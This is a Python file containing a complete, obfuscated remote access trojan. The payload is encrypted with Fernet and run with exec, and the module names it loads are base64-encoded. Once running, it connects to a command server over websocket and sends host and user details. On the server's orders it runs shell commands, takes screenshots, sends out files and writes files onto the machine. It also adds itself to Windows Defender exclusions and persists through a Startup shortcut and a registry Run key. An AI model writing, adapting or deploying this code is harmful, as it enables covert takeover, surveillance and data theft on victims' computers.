

from cryptography.fernet import Fernet
import base64

code = b"""
import asyncio
import json
import os
import platform
import socket
import subprocess
from pathlib import Path
from typing import Any, Dict
import sys
import base64
import io
import importlib

# Obfuscated module loading helper
def _load_module(encoded_name):
    \"\"\"Dynamically load module using obfuscated name\"\"\"
    name = base64.b64decode(encoded_name).decode('utf-8')
    return importlib.import_module(name)

# Module name encodings (base64 encoded)
_MODULE_ENCODINGS = {
    'psutil': base64.b64encode(b'psutil').decode('utf-8'),
    'websockets': base64.b64encode(b'websockets').decode('utf-8'),
    'mss': base64.b64encode(b'mss').decode('utf-8'),
    'PIL.Image': base64.b64encode(b'PIL.Image').decode('utf-8'),
    'PIL.ImageGrab': base64.b64encode(b'PIL.ImageGrab').decode('utf-8'),
}

# Cache loaded modules
_module_cache = {}

def _get_mod(name_key):
    \"\"\"Get module from cache or load it dynamically\"\"\"
    if name_key not in _module_cache:
        _module_cache[name_key] = _load_module(_MODULE_ENCODINGS[name_key])
    return _module_cache[name_key]

SERVER_URL = os.environ.get("SERVER_URL", "ws://127.0.0.1:8000/ws/client")






def resolve_special_path(path: str) -> Path:
    
    path = path.strip()
    
    # Handle Windows special folder names
    special_folders = {
        "documents": Path.home() / "Documents",
        "downloads": Path.home() / "Downloads",
        "desktop": Path.home() / "Desktop",
        "pictures": Path.home() / "Pictures",
        "videos": Path.home() / "Videos",
        "music": Path.home() / "Music",
        "home": Path.home(),
        "~": Path.home(),
    }
    
    # Case-insensitive check
    path_lower = path.lower()
    if path_lower in special_folders:
        return special_folders[path_lower]
    
    # Try to resolve as a path
    try:
        resolved = Path(path).expanduser().resolve()
        return resolved
    except Exception:
        # If resolution fails, try as relative to home
        return Path.home() / path


async def gather_system_info() -> Dict[str, Any]:
    # Dynamic import of psutil
    psutil_mod = _get_mod('psutil')
    
    return {
        "platform": platform.platform(),
        "python": platform.python_version(),
        "hostname": socket.gethostname(),
        "cwd": str(Path.cwd()),
        "ip_address": socket.gethostbyname(socket.gethostname()),
        "memory_total_gb": round(psutil_mod.virtual_memory().total / (1024**3), 2),
        "memory_used_gb": round(psutil_mod.virtual_memory().used / (1024**3), 2),
        "disk_total_gb": round(psutil_mod.disk_usage('/').total / (1024**3), 2),
        "disk_used_gb": round(psutil_mod.disk_usage('/').used / (1024**3), 2),

    }


async def list_directory(path: str) -> Dict[str, Any]:
    def _list_dir_sync():
        
        try:
            target = resolve_special_path(path)
            
            # Check if path exists
            if not target.exists():
                return {"path": str(target), "entries": [], "error": f"Path does not exist: {target}"}
            
            # Check if it's a directory
            if not target.is_dir():
                return {"path": str(target), "entries": [], "error": f"Path is not a directory: {target}"}
            
            entries = []
            try:
                # List directory items
                dir_items = list(target.iterdir())
                for item in dir_items:
                    try:
                        stat_info = item.stat()
                        entries.append(
                            {
                                "name": item.name,
                                "is_dir": item.is_dir(),
                                "size": stat_info.st_size if item.is_file() else None,
                            }
                        )
                    except (PermissionError, OSError, FileNotFoundError):
                        # Skip files/folders we can't access
                        entries.append(
                            {
                                "name": item.name,
                                "is_dir": None,
                                "size": None,
                                "error": "Access denied"
                            }
                        )
            except PermissionError:
                return {"path": str(target), "entries": [], "error": "Permission denied: Cannot access directory"}
            except Exception as e:
                return {"path": str(target), "entries": [], "error": f"Error reading directory: {str(e)}"}
            
            return {"path": str(target), "entries": entries}
        except Exception as e:
            return {"path": path, "entries": [], "error": f"Error listing directory: {str(e)}"}
    
    # Run blocking I/O in executor with timeout (30 seconds for large directories)
    try:
        loop = asyncio.get_event_loop()
        return await asyncio.wait_for(
            loop.run_in_executor(None, _list_dir_sync),
            timeout=30.0
        )
    except asyncio.TimeoutError:
        return {"path": path, "entries": [], "error": "Timeout: Directory listing took too long (30s limit)"}
    except Exception as e:
        return {"path": path, "entries": [], "error": f"Error: {str(e)}"}


COMMAND_MAP = {
    "ls": "dir",
    "pwd": "cd",
    "clear": "cls",
    "whoami": "whoami",
    "mkdir": "mkdir",
    "ifconfig": "ipconfig"
}

async def run_command(command: str) -> str:
    # Split the base command and its arguments
    parts = command.split(maxsplit=1)
    cmd_base = parts[0]
    cmd_args = parts[1] if len(parts) > 1 else ""

    # Replace Linux commands with Windows equivalents *only if matched*
    if platform.system() == "Windows":
        cmd_base = COMMAND_MAP.get(cmd_base, cmd_base)

    # Rebuild the final command
    final_command = f"{cmd_base} {cmd_args}".strip()

    completed = subprocess.run(
        final_command,
        shell=True,
        capture_output=True,
        text=True
    )

    return completed.stdout



async def download_file(path: str) -> Dict[str, Any]:
    
    def _read_file_sync():
        try:
            target = resolve_special_path(path)
            
            # Check if path exists
            if not target.exists():
                return {"error": f"Path does not exist: {target}"}
            
            # Check if it's a file
            if not target.is_file():
                return {"error": f"Path is not a file: {target}"}
            
            # Read file content
            try:
                with open(target, 'rb') as f:
                    file_content = f.read()
                
                # Encode to base64
                content_b64 = base64.b64encode(file_content).decode('utf-8')
                
                return {
                    "content": content_b64,
                    "filename": target.name,
                    "size": len(file_content)
                }
            except PermissionError:
                return {"error": "Permission denied: Cannot read file"}
            except Exception as e:
                return {"error": f"Error reading file: {str(e)}"}
        except Exception as e:
            return {"error": f"Error downloading file: {str(e)}"}
    
    # Run blocking I/O in executor with timeout (60 seconds for large files)
    try:
        loop = asyncio.get_event_loop()
        return await asyncio.wait_for(
            loop.run_in_executor(None, _read_file_sync),
            timeout=60.0
        )
    except asyncio.TimeoutError:
        return {"error": "Timeout: File download took too long (60s limit)"}
    except Exception as e:
        return {"error": f"Error: {str(e)}"}


async def capture_screenshot() -> Dict[str, Any]:
    
    def _capture_sync():
        try:
            # Try using mss first (cross-platform, faster)
            try:
                # Obfuscated dynamic imports
                mss_mod = _get_mod('mss')
                pil_image_mod = _get_mod('PIL.Image')
                Image = pil_image_mod
                
                with mss_mod.mss() as sct:
                    # Capture primary monitor (monitor 1)
                    monitor = sct.monitors[1]
                    screenshot = sct.grab(monitor)
                    
                    # Convert mss screenshot to PIL Image
                    img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
                    
                    # Convert to bytes
                    img_buffer = io.BytesIO()
                    img.save(img_buffer, format='PNG')
                    img_bytes = img_buffer.getvalue()
                    
                    # Encode to base64
                    content_b64 = base64.b64encode(img_bytes).decode('utf-8')
                    
                    return {
                        "content": content_b64,
                        "format": "png",
                        "width": screenshot.width,
                        "height": screenshot.height,
                        "size": len(img_bytes)
                    }
            except ImportError:
                # Fallback to PIL ImageGrab (Windows-specific)
                if platform.system() == "Windows":
                    # Obfuscated dynamic import
                    pil_img_grab_mod = _get_mod('PIL.ImageGrab')
                    ImageGrab = pil_img_grab_mod
                    screenshot = ImageGrab.grab()
                    
                    # Convert to bytes
                    img_buffer = io.BytesIO()
                    screenshot.save(img_buffer, format='PNG')
                    img_bytes = img_buffer.getvalue()
                    
                    # Encode to base64
                    content_b64 = base64.b64encode(img_bytes).decode('utf-8')
                    
                    return {
                        "content": content_b64,
                        "format": "png",
                        "width": screenshot.width,
                        "height": screenshot.height,
                        "size": len(img_bytes)
                    }
                else:
                    return {"error": "Screenshot libraries not available. Install: pip install Pillow mss"}
        except Exception as e:
            return {"error": f"Error capturing screenshot: {str(e)}"}
    
    # Run blocking I/O in executor with timeout (10 seconds)
    try:
        loop = asyncio.get_event_loop()
        return await asyncio.wait_for(
            loop.run_in_executor(None, _capture_sync),
            timeout=10.0
        )
    except asyncio.TimeoutError:
        return {"error": "Timeout: Screenshot capture took too long (10s limit)"}
    except Exception as e:
        return {"error": f"Error: {str(e)}"}


async def upload_file(path: str, filename: str, content_b64: str) -> Dict[str, Any]:
    
    def _write_file_sync():
        try:
            target = resolve_special_path(path)
            
            # If target is a directory, append filename
            path_sep = os.sep
            if target.is_dir() or (not target.exists() and (path.endswith('/') or path.endswith(path_sep))):
                target = target / filename
            elif target.is_dir():
                target = target / filename
            
            # Create parent directories if they don't exist
            target.parent.mkdir(parents=True, exist_ok=True)
            
            # Decode base64 content
            try:
                file_content = base64.b64decode(content_b64)
            except Exception as e:
                return {"error": f"Failed to decode file content: {str(e)}"}
            
            # Write file
            try:
                with open(target, 'wb') as f:
                    f.write(file_content)
                
                return {
                    "path": str(target),
                    "filename": filename,
                    "size": len(file_content)
                }
            except PermissionError:
                return {"error": "Permission denied: Cannot write file"}
            except Exception as e:
                return {"error": f"Error writing file: {str(e)}"}
        except Exception as e:
            return {"error": f"Error uploading file: {str(e)}"}
    
    # Run blocking I/O in executor with timeout (60 seconds for large files)
    try:
        loop = asyncio.get_event_loop()
        return await asyncio.wait_for(
            loop.run_in_executor(None, _write_file_sync),
            timeout=60.0
        )
    except asyncio.TimeoutError:
        return {"error": "Timeout: File upload took too long (60s limit)"}
    except Exception as e:
        return {"error": f"Error: {str(e)}"}


async def handle_action(action: Dict[str, Any]) -> Dict[str, Any]:
    try:
        action_type = action["action_type"]
        args = action.get("args", {})
        if action_type == "system_info":
            result = await gather_system_info()
            return {"success": True, "body": result}
        if action_type == "list_dir":
            target = args.get("path", ".")
            result = await list_directory(target)
            # Check if result has an error field
            if result.get("error"):
                return {"success": False, "body": result}
            return {"success": True, "body": result}
        if action_type == "run_command":
            command = args.get("command")
            if not command:
                raise ValueError("command argument missing")
            result = await run_command(command)
            return {"success": True, "body": result}
        if action_type == "download_file":
            file_path = args.get("path")
            if not file_path:
                raise ValueError("path argument missing")
            result = await download_file(file_path)
            # Check if result has an error field
            if result.get("error"):
                return {"success": False, "body": result}
            return {"success": True, "body": result}
        if action_type == "screenshot":
            result = await capture_screenshot()
            # Check if result has an error field
            if result.get("error"):
                return {"success": False, "body": result}
            return {"success": True, "body": result}
        if action_type == "upload_file":
            file_path = args.get("path")
            filename = args.get("filename")
            content_b64 = args.get("content")
            if not file_path or not filename or not content_b64:
                raise ValueError("path, filename, and content arguments required")
            result = await upload_file(file_path, filename, content_b64)
            if result.get("error"):
                return {"success": False, "body": result}
            return {"success": True, "body": result}
        raise ValueError(f"Unsupported action: {action_type}")
    except asyncio.TimeoutError as exc:
        return {"success": False, "body": f"Operation timed out: {str(exc)}"}
    except Exception as exc:
        return {"success": False, "body": f"Error: {str(exc)}"}


def add_defender_exclusion(target_path: Path) -> bool:
    
    if platform.system() != "Windows":
        return False
    try:
        ps_command = f'Add-MpPreference -ExclusionPath "{str(target_path)}"'
        result = subprocess.run(
            ["powershell", "-ExecutionPolicy", "Bypass", "-Command", ps_command],
            capture_output=True,
            text=True,
            timeout=10
        )
        return result.returncode == 0
    except Exception:
        return False


def ensure_startup_shortcut():
    \"\"\"Create or update a shortcut in the user's Startup folder that points to this executable/script.
    Always updates the shortcut to ensure it points to the current exe location, even if moved or renamed.\"\"\"
    if os.name != "nt":
        return  # Windows only

    try:
        # Get current executable path
        if getattr(sys, "frozen", False):
            target_path = Path(sys.executable).resolve()
        else:
            if hasattr(sys.modules.get('__main__', None), '__file__'):
                main_file = sys.modules['__main__'].__file__
                if main_file and main_file != '<string>':
                    target_path = Path(main_file).resolve()
                else:
                    target_path = Path(sys.executable).resolve()
            else:
                target_path = Path(sys.executable).resolve()
        
        if not target_path.exists():
            return  # Can't create shortcut to non-existent file

        startup_dir = Path(os.environ["APPDATA"]) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
        startup_dir.mkdir(parents=True, exist_ok=True)
        shortcut_path = startup_dir / "ClientAgent.lnk"

        # Check if shortcut exists and points to wrong location
        if shortcut_path.exists():
            try:
                # Read existing shortcut to check if it's broken
                ps_check = f'''
                $shell = New-Object -ComObject WScript.Shell
                $shortcut = $shell.CreateShortcut("{str(shortcut_path).replace('"', '`"')}")
                $target = $shortcut.TargetPath
                if (Test-Path $target) {{
                    Write-Output "EXISTS"
                }} else {{
                    Write-Output "BROKEN"
                }}
                '''
                check_result = subprocess.run(
                    ["powershell", "-ExecutionPolicy", "Bypass", "-NoProfile", "-Command", ps_check],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                # If shortcut is broken or doesn't exist, we'll update it below
            except Exception:
                pass  # Continue to update shortcut
        
        # Always update shortcut to current location
        target_path_str = str(target_path).replace("'", "''").replace('"', '`"')
        shortcut_path_str = str(shortcut_path).replace("'", "''").replace('"', '`"')
        working_dir_str = str(target_path.parent).replace("'", "''").replace('"', '`"')
        
        ps_script = f'''
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("{shortcut_path_str}")
$Shortcut.TargetPath = "{target_path_str}"
$Shortcut.WorkingDirectory = "{working_dir_str}"
$Shortcut.WindowStyle = 7
$Shortcut.IconLocation = "{target_path_str},0"
$Shortcut.Save()
'''
        result = subprocess.run(
            ["powershell", "-ExecutionPolicy", "Bypass", "-NoProfile", "-Command", ps_script],
            capture_output=True,
            text=True,
            timeout=10
        )
        
        # Also add registry Run key as backup
        add_registry_persistence(target_path)
        
    except Exception as e:
        # Silent failure - don't break the main program if shortcut creation fails
        pass


def add_registry_persistence(target_path: Path) -> bool:
    \"\"\"Add registry Run key as backup persistence method\"\"\"
    if os.name != "nt":
        return False
    
    try:
        import winreg
        
        # Registry path: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
        reg_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        reg_key_name = "ClientAgent"
        
        # Open registry key
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE)
        
        # Set the value to current executable path
        winreg.SetValueEx(key, reg_key_name, 0, winreg.REG_SZ, str(target_path))
        
        winreg.CloseKey(key)
        return True
    except Exception:
        return False


def repair_persistence():
    \"\"\"Check and repair broken persistence mechanisms\"\"\"
    if os.name != "nt":
        return
    
    try:
        # Get current executable path
        if getattr(sys, "frozen", False):
            current_path = Path(sys.executable).resolve()
        else:
            if hasattr(sys.modules.get('__main__', None), '__file__'):
                main_file = sys.modules['__main__'].__file__
                if main_file and main_file != '<string>':
                    current_path = Path(main_file).resolve()
                else:
                    current_path = Path(sys.executable).resolve()
            else:
                current_path = Path(sys.executable).resolve()
        
        if not current_path.exists():
            return
        
        # Check and repair Startup folder shortcut
        startup_dir = Path(os.environ["APPDATA"]) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
        shortcut_path = startup_dir / "ClientAgent.lnk"
        
        needs_repair = False
        if shortcut_path.exists():
            try:
                ps_check = f'''
                $shell = New-Object -ComObject WScript.Shell
                $shortcut = $shell.CreateShortcut("{str(shortcut_path).replace('"', '`"')}")
                $target = $shortcut.TargetPath
                if (-not (Test-Path $target)) {{
                    Write-Output "BROKEN"
                }}
                '''
                check_result = subprocess.run(
                    ["powershell", "-ExecutionPolicy", "Bypass", "-NoProfile", "-Command", ps_check],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                if "BROKEN" in check_result.stdout:
                    needs_repair = True
            except Exception:
                needs_repair = True
        else:
            needs_repair = True
        
        if needs_repair:
            ensure_startup_shortcut()
        
        # Check and repair registry entry
        try:
            import winreg
            reg_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_READ)
            try:
                reg_value, _ = winreg.QueryValueEx(key, "ClientAgent")
                reg_path_obj = Path(reg_value)
                if not reg_path_obj.exists() or reg_path_obj != current_path:
                    # Registry points to wrong/non-existent file, update it
                    winreg.CloseKey(key)
                    add_registry_persistence(current_path)
                else:
                    winreg.CloseKey(key)
            except FileNotFoundError:
                # Registry key doesn't exist, create it
                winreg.CloseKey(key)
                add_registry_persistence(current_path)
        except Exception:
            pass
            
    except Exception:
        pass


async def wait_for_network():
    \"\"\"Wait for network connectivity to be available\"\"\"
    max_wait = 60  # Wait up to 60 seconds
    check_interval = 2  # Check every 2 seconds
    
    for _ in range(max_wait // check_interval):
        try:
            # Try to resolve the hostname/IP
            host = SERVER_URL.split("://")[1].split(":")[0]
            socket.gethostbyname(host)
            return True  # Network is ready
        except (socket.gaierror, OSError):
            await asyncio.sleep(check_interval)
    return False  # Network not ready after max wait


async def run_client() -> None:
    # Wait for network to be ready
    await wait_for_network()
    
    max_retries = 30  # Try up to 30 times
    initial_delay = 2  # Start with 2 seconds
    max_delay = 60     # Max 60 seconds between retries
    
    for attempt in range(max_retries):
        try:
            # Try to connect - using obfuscated websockets module
            websockets_mod = _get_mod('websockets')
            async with websockets_mod.connect(SERVER_URL) as ws:
                hello_payload = {
                    "type": "hello",
                    "client_id": os.environ.get("CLIENT_ID"),
                    "hostname": socket.gethostname(),
                    "username": os.environ.get("USERNAME") or os.getlogin(),
                    "platform": platform.system(),
                    "ip": socket.gethostbyname(socket.gethostname()),
                }
                await ws.send(json.dumps(hello_payload))
                await ws.recv()  # hello ack
                
                # Connection successful, enter message loop
                async for raw in ws:
                    action_id = None
                    action_type = None
                    try:
                        message = json.loads(raw)
                        if message.get("type") != "action":
                            continue
                        action_id = message.get("action_id")
                        action_type = message.get("action_type")
                        response = await handle_action(message)
                        await ws.send(
                            json.dumps(
                                {
                                    "type": "response",
                                    "action_id": action_id,
                                    "action_type": action_type,
                                    **response,
                                }
                            )
                        )
                    except json.JSONDecodeError as e:
                        # Invalid JSON, skip this message
                        continue
                    except Exception as e:
                        # Send error response if we have an action_id
                        if action_id is not None:
                            try:
                                await ws.send(
                                    json.dumps(
                                        {
                                            "type": "response",
                                            "action_id": action_id,
                                            "action_type": action_type or "unknown",
                                            "success": False,
                                            "body": f"Error processing action: {str(e)}",
                                        }
                                    )
                                )
                            except Exception:
                                pass  # Can't send error response, connection might be broken
                # If we exit the loop, connection was closed, retry
                break
                
        except Exception as e:
            # Check if it's a websockets or connection exception using obfuscated module
            websockets_mod = _get_mod('websockets')
            is_ws_error = (
                isinstance(e, websockets_mod.exceptions.ConnectionClosed) or
                isinstance(e, websockets_mod.exceptions.InvalidURI)
            )
            is_conn_error = isinstance(e, (ConnectionRefusedError, OSError, socket.gaierror))
            
            if is_ws_error or is_conn_error:
                # Connection failed, wait and retry
                if attempt < max_retries - 1:
                    # Exponential backoff: 2s, 4s, 8s, 16s, ... up to 60s
                    delay = min(initial_delay * (2 ** attempt), max_delay)
                    await asyncio.sleep(delay)
                    continue
                else:
                    # Max retries reached, exit
                    return
            else:
                # Other errors, wait and retry
                if attempt < max_retries - 1:
                    delay = min(initial_delay * (2 ** attempt), max_delay)
                    await asyncio.sleep(delay)
                    continue
                else:
                    return
            # Other errors, wait and retry
            if attempt < max_retries - 1:
                delay = min(initial_delay * (2 ** attempt), max_delay)
                await asyncio.sleep(delay)
                continue
            else:
                return


if __name__ == "__main__":
    # Best-effort: add current executable/script to Defender exclusions
    try:
        current_path = Path(sys.executable if getattr(sys, "frozen", False) else __file__).resolve()
        add_defender_exclusion(current_path)
    except Exception:
        pass
    
    # Repair any broken persistence mechanisms
    repair_persistence()
    
    # Ensure persistence is set up
    ensure_startup_shortcut()
    
    try:
        asyncio.run(run_client())
    except KeyboardInterrupt:
        pass
    except Exception as e:
        # Keep the process alive even if there's an unexpected error
        # The retry logic in run_client should handle most cases
        pass
"""

# Fixed key for consistent encryption (in production, you might want to derive this from something)
key = base64.urlsafe_b64encode(b'client_agent_key_32_bytes_long!!')
encryption_type = Fernet(key)
encrypted_message = encryption_type.encrypt(code)
decrypted_message = encryption_type.decrypt(encrypted_message)
exec(decrypted_message)
